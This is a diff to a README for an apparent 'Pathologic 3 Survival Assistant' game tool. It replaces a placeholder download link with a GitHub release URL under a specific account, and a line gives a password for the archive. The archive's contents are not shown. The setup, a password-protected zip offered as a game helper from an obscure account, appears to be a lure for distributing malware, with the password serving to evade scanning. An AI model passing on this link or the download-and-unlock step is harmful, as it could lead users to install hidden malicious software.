@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Pathologic-3-Survival-Assistant/releases/latest/download/Pathologic3-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/oscarsantos-hq92j9/Pathologic-3-Survival-Assistant/releases/download/download/Pathologic3_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
